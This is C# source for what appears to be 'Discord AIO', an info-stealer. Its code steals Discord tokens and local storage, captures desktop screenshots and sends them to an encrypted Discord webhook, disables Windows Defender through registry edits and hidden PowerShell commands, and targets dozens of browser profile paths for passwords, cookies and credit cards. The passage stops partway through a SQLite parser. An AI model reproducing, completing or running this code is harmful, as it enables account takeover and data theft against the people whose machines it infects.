﻿using System.Reflection;
using System.Runtime.InteropServices;
using System;
using System.Net;
using System.Collections.Specialized;
using System.IO;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Linq;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Security.AccessControl;
using System.Management;
using System.Xml;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;

[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: AssemblyVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: Guid("%Guid%")]

namespace DiscordAIO
{
	public class hisName
	{
		public static string howtonameit = "";
	}
	public class DiscordAIO : IDisposable
	{

		public string WebHook { get; set; }

		public string Attachment { get; set; }

		public DiscordAIO()
		{
			this.dWebClient = new WebClient();
		}

		public void SendMessage(string msgSend)
		{
			DiscordAIO.discordValues.Add("content", msgSend);
			this.dWebClient.UploadValues(this.WebHook, DiscordAIO.discordValues);
		}

		public void SendAttachment(string path)
		{
			this.dWebClient.UploadFile(this.WebHook, path);
		}

		public void Dispose()
		{
			this.dWebClient.Dispose();
		}

		private readonly WebClient dWebClient;

		private static NameValueCollection discordValues = new NameValueCollection();
	}
	// Special thanks to Khainaaeh for Webhook code
	public class DiscordWebhook
	{
		private static string LGypdKjLanewaSBd = "AIOwebhook";
		private static string jEyJpUPbRcEGTMmz = hrzWhUXycwFfbzUe(LGypdKjLanewaSBd);
		public static string Send(string mssg)
		{
			Dictionary<string, object> postParameters = new Dictionary<string, object>();
			postParameters.Add("username", "Discord AIO");
			postParameters.Add("content", mssg);
			postParameters.Add("avatar_url", "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");


			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(jEyJpUPbRcEGTMmz, "Discord AIO", postParameters);
			StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
			string fullResponse = responseReader.ReadToEnd();
			webResponse.Close();

			return fullResponse;
		}

		public static string SendFile(string mssgBody, string filename, string fileformat, string filepath, string application)
		{
			FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read);
			byte[] data = new byte[fs.Length];
			fs.Read(data, 0, data.Length);
			fs.Close();
			Dictionary<string, object> postParameters = new Dictionary<string, object>();
			postParameters.Add("filename", filename);
			postParameters.Add("fileformat", fileformat);
			postParameters.Add("file", new FormUpload.FileParameter(data, filename, application));
			postParameters.Add("username", "Discord AIO");
			postParameters.Add("content", mssgBody);
			postParameters.Add("avatar_url", "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");



			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(jEyJpUPbRcEGTMmz, "Discord AIO", postParameters);
			StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
			string fullResponse = responseReader.ReadToEnd();
			webResponse.Close();

			// x

			return fullResponse;
		}

		public static string SendPhoto(string filename, string fileformat, string filepath, string application)
		{
			FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read);
			byte[] data = new byte[fs.Length];
			fs.Read(data, 0, data.Length);
			fs.Close();
			Dictionary<string, object> postParameters = new Dictionary<string, object>();
			postParameters.Add("filename", filename);
			postParameters.Add("fileformat", fileformat);
			postParameters.Add("file", new FormUpload.FileParameter(data, filename, application));
			postParameters.Add("username", "Discord AIO");
			postParameters.Add("avatar_url", "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");

			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(jEyJpUPbRcEGTMmz, "Discord AIO", postParameters);
			StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
			string fullResponse = responseReader.ReadToEnd();
			webResponse.Close();

			return fullResponse;
		}

		public static string hrzWhUXycwFfbzUe(string cipherText)
		{
			int Keysize = 256;
			int DerivationIterations = 1000;

			var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
			var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
			var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
			var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();
			using (var password = new Rfc2898DeriveBytes("JRLpmxDuzEpHFFJDrThphvBFFpgAmVnGWttWzBJXTxHxmrbDrPVDRcxVPKBAjwBcUkJtqUkzwtHsgZkbNNNvZYhumBvAYakevKeH", saltStringBytes, DerivationIterations))
			{
				var keyBytes = password.GetBytes(Keysize / 8);
				using (var symmetricKey = new RijndaelManaged())
				{
					symmetricKey.BlockSize = 256;
					symmetricKey.Mode = CipherMode.CBC;
					symmetricKey.Padding = PaddingMode.PKCS7;
					using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
					{
						using (var memoryStream = new MemoryStream(cipherTextBytes))
						{
							using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
							{
								var plainTextBytes = new byte[cipherTextBytes.Length];
								var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
								memoryStream.Close();
								cryptoStream.Close();
								return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
							}
						}
					}
				}
			}
		}
	}

	public static class FormUpload
	{
		private static readonly Encoding encoding = Encoding.UTF8;
		public static HttpWebResponse MultipartFormDataPost(string postUrl, string userAgent, Dictionary<string, object> postParameters)
		{
			string formDataBoundary = String.Format("----------{0:N}", Guid.NewGuid());

			string contentType = "multipart/form-data; boundary=" + formDataBoundary;

			byte[] formData = GetMultipartFormData(postParameters, formDataBoundary);

			return PostForm(postUrl, userAgent, contentType, formData);
		}

		private static HttpWebResponse PostForm(string postUrl, string userAgent, string contentType, byte[] formData)
		{
			HttpWebRequest request = WebRequest.Create(postUrl) as HttpWebRequest;

			if (request == null)
			{
				throw new NullReferenceException("request is not a http request");
			}
			request.Method = "POST";
			request.ContentType = contentType;
			request.UserAgent = userAgent;
			request.CookieContainer = new CookieContainer();
			request.ContentLength = formData.Length;
			using (Stream requestStream = request.GetRequestStream())
			{
				requestStream.Write(formData, 0, formData.Length);
				requestStream.Close();
			}

			return request.GetResponse() as HttpWebResponse;
		}

		private static byte[] GetMultipartFormData(Dictionary<string, object> postParameters, string boundary)
		{
			Stream formDataStream = new System.IO.MemoryStream();
			bool needsCLRF = false;

			foreach (var param in postParameters)
			{
				if (needsCLRF)
					formDataStream.Write(encoding.GetBytes("\r\n"), 0, encoding.GetByteCount("\r\n"));

				needsCLRF = true;

				if (param.Value is FileParameter)
				{
					FileParameter fileToUpload = (FileParameter)param.Value;

					string header = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\"\r\nContent-Type: {3}\r\n\r\n",
						boundary,
						param.Key,
						fileToUpload.FileName ?? param.Key,
						fileToUpload.ContentType ?? "application/octet-stream");

					formDataStream.Write(encoding.GetBytes(header), 0, encoding.GetByteCount(header));

					formDataStream.Write(fileToUpload.File, 0, fileToUpload.File.Length);
				}
				else
				{
					string postData = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}",
						boundary,
						param.Key,
						param.Value);
					formDataStream.Write(encoding.GetBytes(postData), 0, encoding.GetByteCount(postData));
				}
			}

			string footer = "\r\n--" + boundary + "--\r\n";
			formDataStream.Write(encoding.GetBytes(footer), 0, encoding.GetByteCount(footer));

			formDataStream.Position = 0;
			byte[] formData = new byte[formDataStream.Length];
			formDataStream.Read(formData, 0, formData.Length);
			formDataStream.Close();

			return formData;
		}

		public class FileParameter
		{
			public byte[] File { get; set; }
			public string FileName { get; set; }
			public string ContentType { get; set; }
			public FileParameter(byte[] file) : this(file, null) { }
			public FileParameter(byte[] file, string filename) : this(file, filename, null) { }
			public FileParameter(byte[] file, string filename, string contenttype)
			{
				File = file;
				FileName = filename;
				ContentType = contenttype;
			}
		}
	}
	class Handler
	{
		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);
		public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;
		public static readonly string ExploitDirectory = Path.GetDirectoryName(ExploitName);

		public static string[] SysPatch = new string[]
		{
		AppData,
		LocalData,
		CommonData
		};

		public static string zxczxczxc = SysPatch[new Random().Next(0, SysPatch.Length)];
		public static string ExploitDir = zxczxczxc + "\\" + "AIO";
		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");
		public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
		public static string loggedDate = dateLog.ToString();
	}
	class Defender
	{
		public static void KillDefender()
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

			RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
			RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
			RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
			RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
			RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

			CheckDefender();
		}

		private static void RegistryEdit(string regPath, string name, string value)
		{
			try
			{
				using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					if (key == null)
					{
						Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
						return;
					}
					if (key.GetValue(name) != (object)value)
						key.SetValue(name, value, RegistryValueKind.DWord);
				}
			}
			catch { }
		}

		private static void CheckDefender()
		{
			Process proc = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = "Get-MpPreference -verbose",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			proc.Start();
			while (!proc.StandardOutput.EndOfStream)
			{
				string line = proc.StandardOutput.ReadLine();

				if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
					RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");

				else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
					RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");

				else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
					RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

				else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
					RunPS("Set-MpPreference -DisableIOAVProtection $true");

				else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
					RunPS("Set-MpPreference -DisablePrivacyMode $true");

				else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
					RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");

				else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
					RunPS("Set-MpPreference -DisableArchiveScanning $true");

				else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
					RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true");

				else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
					RunPS("Set-MpPreference -DisableScriptScanning $true");

				else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
					RunPS("Set-MpPreference -SubmitSamplesConsent 2");

				else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
					RunPS("Set-MpPreference -MAPSReporting 0");

				else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
					RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force");

				else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
					RunPS("Set-MpPreference -ModerateThreatDefaultAction 6");

				else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
					RunPS("Set-MpPreference -LowThreatDefaultAction 6");

				else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
					RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
			}
		}

		private static void RunPS(string args)
		{
			Process proc = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = args,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			proc.Start();
		}
	}
	internal sealed class PathsDc
	{
		public static string[] sChromiumPswPaths =
		{
			@"\Chromium\User Data\",
			@"\Google\Chrome\User Data\",
			@"\Opera Software\Opera GX Stable\",
			@"\Google(x86)\Chrome\User Data\",
			@"\Opera Software\",
			@"\MapleStudio\ChromePlus\User Data\",
			@"\Iridium\User Data\",
			@"\7Star\7Star\User Data\",
			@"\CentBrowser\User Data\",
			@"\Chedot\User Data\",
			@"\Vivaldi\User Data\",
			@"\Kometa\User Data\",
			@"\Elements Browser\User Data\",
			@"\Epic Privacy Browser\User Data\",
			@"\uCozMedia\Uran\User Data\",
			@"\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer\",
			@"\CatalinaGroup\Citrio\User Data\",
			@"\Coowon\Coowon\User Data\",
			@"\liebao\User Data\",
			@"\QIP Surf\User Data\",
			@"\Orbitum\User Data\",
			@"\Comodo\Dragon\User Data\",
			@"\Amigo\User\User Data\",
			@"\Torch\User Data\",
			@"\Yandex\YandexBrowser\User Data\",
			@"\Comodo\User Data\",
			@"\360Browser\Browser\User Data\",
			@"\Maxthon3\User Data\",
			@"\K-Melon\User Data\",
			@"\Sputnik\Sputnik\User Data\",
			@"\Nichrome\User Data\",
			@"\CocCoc\Browser\User Data\",
			@"\Uran\User Data\",
			@"\Chromodo\User Data\",
			@"\Mail.Ru\Atom\User Data\",
			@"\BraveSoftware\Brave-Browser\User Data\",
		};

		public static string[] sGeckoBrowserPaths = new string[]
		{
			@"\Mozilla\Firefox",
			@"\Waterfox",
			@"\K-Meleon",
			@"\Thunderbird",
			@"\Comodo\IceDragon",
			@"\8pecxstudios\Cyberfox",
			@"\NETGATE Technologies\BlackHaw",
			@"\Moonchild Productions\Pale Moon",
		};

		public static string EdgePath = @"\Microsoft\Edge\User Data";
		public static string appdata = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData);
		public static string lappdata = System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData);

	}
	internal sealed class Filemanager
	{
		public static void RecursiveDelete(string path)
		{
			DirectoryInfo baseDir = new DirectoryInfo(path);

			if (!baseDir.Exists) return;
			foreach (var dir in baseDir.GetDirectories())
				RecursiveDelete(dir.FullName);

			baseDir.Delete(true);
		}
		public static void CopyDirectory(string sourceFolder, string destFolder)
		{
			try
			{
				if (!Directory.Exists(destFolder))
					Directory.CreateDirectory(destFolder);
				string[] files = Directory.GetFiles(sourceFolder);
				foreach (string file in files)
				{
					string name = Path.GetFileName(file);
					string dest = Path.Combine(destFolder, name);
					File.Copy(file, dest);
				}
				string[] folders = Directory.GetDirectories(sourceFolder);
				foreach (string folder in folders)
				{
					string name = Path.GetFileName(folder);
					string dest = Path.Combine(destFolder, name);
					CopyDirectory(folder, dest);
				}
			}
			catch (Exception e)
			{
				Console.WriteLine(e);
			}
		}
		public static long DirectorySize(string path)
		{
			DirectoryInfo dir = new DirectoryInfo(path);
			return dir.GetFiles().Sum(fi => fi.Length) +
				dir.GetDirectories().Sum(di => DirectorySize(di.FullName));
		}
	}
	internal sealed class Discord
	{
		private static Regex TokenRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}");
		private static string[] DiscordDirectories = new string[]{
			"Discord\\Local Storage\\leveldb",
			"Discord PTB\\Local Storage\\leveldb",
			"Discord Canary\\leveldb",
		};

		public static void WriteDiscord()
		{
			try
			{
				string Stealer_Dir = Handler.ExploitDir;
				string[] lcDicordTokens = GetTokens();
				if (lcDicordTokens.Length != 0)
				{
					Directory.CreateDirectory(Stealer_Dir);

					File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\nDiscord AIO report / Made by dv0l \n\n");
					File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "# Tokens \n\n");

					foreach (string token in lcDicordTokens)
						File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, token + "\n");

					File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Tokens \n");

				}
				CopyLevelDb();
			}
			catch (Exception e)
			{
				Console.WriteLine(e);
			}
		}
		private static void CopyLevelDb()
		{
			string Stealer_Dir = Handler.ExploitDir;
			foreach (string dir in DiscordDirectories)
			{
				string directory = Path.GetDirectoryName(Path.Combine(PathsDc.appdata, dir));
				string cpdirectory = Path.Combine(Stealer_Dir,
					new DirectoryInfo(directory).Name);

				if (!Directory.Exists(directory))
					return;
				try
				{
					Filemanager.CopyDirectory(directory, cpdirectory);
				}
				catch { }
			}
		}
		public static string[] GetTokens()
		{
			List<string> tokens = new List<string>();
			try
			{
				foreach (string dir in DiscordDirectories)
				{
					string directory = Path.Combine(PathsDc.appdata, dir);
					string cpdirectory = Path.Combine(Path.GetTempPath(), new DirectoryInfo(directory).Name);

					if (!Directory.Exists(directory))
						continue;

					Filemanager.CopyDirectory(directory, cpdirectory);

					foreach (string file in Directory.GetFiles(cpdirectory))
					{
						if (!file.EndsWith(".log") && !file.EndsWith(".ldb"))
							continue;

						string text = File.ReadAllText(file);
						Match match = TokenRegex.Match(text);
						if (match.Success)
						{
							tokens.Add(string.Format("{0}", match.Value));
						}
					}

					Filemanager.RecursiveDelete(cpdirectory);

				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex);
			}

			return tokens.ToArray();
		}
	}
	internal sealed class Cipher
	{
		private const int Keysize = 256;
		private const int DerivationIterations = 1000;

		public static string Encrypt(string plainText)
		{
			var saltStringBytes = Generate256BitsOfRandomEntropy();
			var ivStringBytes = Generate256BitsOfRandomEntropy();
			var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
			using (var password = new Rfc2898DeriveBytes("zTj8SWKbamgzfHYWamRd2A24ZrtdWe", saltStringBytes, DerivationIterations))
			{
				var keyBytes = password.GetBytes(Keysize / 8);
				using (var symmetricKey = new RijndaelManaged())
				{
					symmetricKey.BlockSize = 256;
					symmetricKey.Mode = CipherMode.CBC;
					symmetricKey.Padding = PaddingMode.PKCS7;
					using (var encryptor = symmetricKey.CreateEncryptor(keyBytes, ivStringBytes))
					{
						using (var memoryStream = new MemoryStream())
						{
							using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
							{
								cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
								cryptoStream.FlushFinalBlock();
								var cipherTextBytes = saltStringBytes;
								cipherTextBytes = cipherTextBytes.Concat(ivStringBytes).ToArray();
								cipherTextBytes = cipherTextBytes.Concat(memoryStream.ToArray()).ToArray();
								memoryStream.Close();
								cryptoStream.Close();
								return Convert.ToBase64String(cipherTextBytes);
							}
						}
					}
				}
			}
		}

		private static byte[] Generate256BitsOfRandomEntropy()
		{
			var randomBytes = new byte[32];
			using (var rngCsp = new RNGCryptoServiceProvider())
			{
				rngCsp.GetBytes(randomBytes);
			}
			return randomBytes;
		}
	}
	internal sealed class dPictures
	{
		[DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
		static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
		[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		static extern IntPtr SendMessageTimeout(
			IntPtr windowHandle,
			uint Msg,
			IntPtr wParam,
			IntPtr lParam,
			SendMessageTimeoutFlags flags,
			uint timeout,
			out IntPtr result);
		[Flags]
		enum SendMessageTimeoutFlags : uint
		{
			SMTO_NORMAL = 0x0,
			SMTO_BLOCK = 0x1,
			SMTO_ABORTIFHUNG = 0x2,
			SMTO_NOTIMEOUTIFNOTHUNG = 0x8
		}
		const int WM_COMMAND = 0x111;
		const int MIN_ALL = 419;
		const int MIN_ALL_UNDO = 416;

		static void ss()
		{
			Thread.Sleep(500);
			Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			using (Graphics g = Graphics.FromImage(bmp))
			{
				g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
				bmp.Save("des.png");
				upload();
			}

		}

		static void upload()
		{
			string fileformat = "png";
			string filepath = Handler.ExploitDirectory + "\\des.png";
			string application = "";
			try
			{
				DiscordWebhook.SendPhoto("des.png", fileformat, filepath, application);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
				DiscordWebhook.Send("Unable to send desktop screenshot.");
			}

			if (File.Exists("des.png"))
			{
				File.Delete("des.png");
			}
		}

		public static void Piccc()
		{
			IntPtr OutResult;
			IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
			SendMessageTimeout(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero, SendMessageTimeoutFlags.SMTO_ABORTIFHUNG, 2000, out OutResult);
			ss();
		}
	}
	#region common
	public struct Password
	{
		public string sUrl { get; set; }
		public string sUsername { get; set; }
		public string sPassword { get; set; }
	}

	internal struct Cookie
	{
		public string sHostKey { get; set; }
		public string sName { get; set; }
		public string sPath { get; set; }
		public string sExpiresUtc { get; set; }
		public string sKey { get; set; }
		public string sValue { get; set; }
		public string sIsSecure { get; set; }
	}

	internal struct CreditCard
	{
		public string sNumber { get; set; }
		public string sExpYear { get; set; }
		public string sExpMonth { get; set; }
		public string sName { get; set; }
	}

	internal struct AutoFill
	{
		public string sName;
		public string sValue;
	}

	internal struct Site
	{
		public string sUrl { get; set; }
		public string sTitle { get; set; }
		public int iCount { get; set; }
	}

	internal struct Bookmark
	{
		public string sUrl { get; set; }
		public string sTitle { get; set; }
	}
	#endregion
	#region StealerPassUtils
	internal class SQLite
	{
		private readonly byte[] _sqlDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
		private readonly ulong _dbEncoding;
		private readonly byte[] _fileBytes;
		private readonly ulong _pageSize;
		private string[] _fieldNames;
		private SqliteMasterEntry[] _masterTableEntries;
		private TableEntry[] _tableEntries;

		public SQLite(string fileName)
		{
			_fileBytes = File.ReadAllBytes(fileName);
			_pageSize = ConvertToULong(16, 2);
			_dbEncoding = ConvertToULong(56, 4);
			ReadMasterTable(100L);
		}

		public string GetValue(int rowNum, int field)
		{
			try
			{
				if (rowNum >= _tableEntries.Length)
					return (string)null;
				return field >= _tableEntries[rowNum].Content.Length ? null : _tableEntries[rowNum].Content[field];
			}
			catch
			{
				return "";
			}
		}

		public int GetRowCount()
		{
			return _tableEntries.Length;
		}

		private bool ReadTableFromOffset(ulong offset)
		{
			try
			{
				if (_fileBytes[offset] == 13)
				{
					uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
					int num2 = 0;
					if (_tableEntries != null)
					{
						num2 = _tableEntries.Length;
						Array.Resize(ref _tableEntries, _tableEntries.Length + (int)num1 + 1);
					}
					else
						_tableEntries = new TableEntry[(int)num1 + 1];
					for (uint index1 = 0; (int)index1 <= (int)num1; ++index1)
					{
						ulong num3 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
						if ((long)offset != 100L)
							num3 += offset;
						int endIdx1 = Gvl((int)num3);
						Cvl((int)num3, endIdx1);
						int endIdx2 = Gvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L));
						Cvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L), endIdx2);
						ulong num4 = num3 + (ulong)(endIdx2 - (long)num3 + 1L);
						int endIdx3 = Gvl((int)num4);
						int endIdx4 = endIdx3;
						long num5 = Cvl((int)num4, endIdx3);
						RecordHeaderField[] array = null;
						long num6 = (long)num4 - endIdx3 + 1L;
						int index2 = 0;
						while (num6 < num5)
						{
							Array.Resize(ref array, index2 + 1);
							int startIdx = endIdx4 + 1;
							endIdx4 = Gvl(startIdx);
							array[index2].Type = Cvl(startIdx, endIdx4);
							array[index2].Size = array[index2].Type <= 9L ? _sqlDataTypeSize[array[index2].Type] : (!IsOdd(array[index2].Type) ? (array[index2].Type - 12L) / 2L : (array[index2].Type - 13L) / 2L);
							num6 = num6 + (endIdx4 - startIdx) + 1L;
							++index2;
						}
						if (array != null)
						{
							_tableEntries[num2 + (int)index1].Content = new string[array.Length];
							int num7 = 0;
							for (int index3 = 0; index3 <= array.Length - 1; ++index3)
							{
								if (array[index3].Type > 9L)
								{
									if (!IsOdd(array[index3].Type))
									{
										if ((long)_dbEncoding == 1L)
											_tableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
										else if ((long)_dbEncoding == 2L)
										{
											_tableEntries[num2 + (int)index1].Content[index3] = Encoding.Unicode.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
										}
										else if ((long)_dbEncoding == 3L)
											_tableEntries[num2 + (int)index1].Content[index3] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
									}
									else
										_tableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
								}
								else
									_tableEntries[num2 + (int)index1].Content[index3] = Convert.ToString(ConvertToULong((int)((long)num4 + num5 + num7), (int)array[index3].Size));
								num7 += (int)array[index3].Size;
							}
						}
					}
				}
				else if (_fileBytes[offset] == 5)
				{
					uint num1 = (uint)(ConvertToULong((int)((long)offset + 3L), 2) - 1UL);
					for (uint index = 0; (int)index <= (int)num1; ++index)
					{
						uint num2 = (uint)ConvertToULong((int)offset + 12 + (int)index * 2, 2);
						ReadTableFromOffset((ConvertToULong((int)((long)offset + num2), 4) - 1UL) * _pageSize);
					}
					ReadTableFromOffset((ConvertToULong((int)((long)offset + 8L), 4) - 1UL) * _pageSize);
				}
				return true;
			}
			catch
			{
				return false;
			}
		}

		private void ReadMasterTable(long offset)
		{
			try
			{
				switch (_fileBytes[offset])
				{
					case 5:
						uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
						for (int index = 0; index <= (int)num1; ++index)
						{
							uint num2 = (uint)ConvertToULong((int)offset + 12 + index * 2, 2);
							if (offset == 100L)
								ReadMasterTable(((long)ConvertToULong((int)num2, 4) - 1L) * (long)_pageSize);
							else
								ReadMasterTable(((long)ConvertToULong((int)(offset + num2), 4) - 1L) * (long)_pageSize);
						}
						ReadMasterTable(((long)ConvertToULong((int)offset + 8, 4) - 1L) * (long)_pageSize);
						break;
					case 13:
						ulong num3 = ConvertToULong((int)offset + 3, 2) - 1UL;
						int num4 = 0;
						if (_masterTableEntries != null)
						{
							num4 = _masterTableEntries.Length;
							Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num3 + 1);
						}
						else
							_masterTableEntries = new SqliteMasterEntry[checked((ulong)unchecked((long)num3 + 1L))];
						for (ulong index1 = 0; index1 <= num3; ++index1)
						{
							ulong num2 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
							if (offset != 100L)
								num2 += (ulong)offset;
							int endIdx1 = Gvl((int)num2);
							Cvl((int)num2, endIdx1);
							int endIdx2 = Gvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L));
							Cvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L), endIdx2);
							ulong num5 = num2 + (ulong)(endIdx2 - (long)num2 + 1L);
							int endIdx3 = Gvl((int)num5);
							int endIdx4 = endIdx3;
							long num6 = Cvl((int)num5, endIdx3);
							long[] numArray = new long[5];
							for (int index2 = 0; index2 <= 4; ++index2)
							{
								int startIdx = endIdx4 + 1;
								endIdx4 = Gvl(startIdx);
								numArray[index2] = Cvl(startIdx, endIdx4);
								numArray[index2] = numArray[index2] <= 9L ? _sqlDataTypeSize[numArray[index2]] : (!IsOdd(numArray[index2]) ? (numArray[index2] - 12L) / 2L : (numArray[index2] - 13L) / 2L);
							}
							if ((long)_dbEncoding == 1L || (long)_dbEncoding == 2L)

								if ((long)_dbEncoding == 1L)
									_masterTableEntries[num4 + (int)index1].ItemName = Encoding.Default.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
								else if ((long)_dbEncoding == 2L)
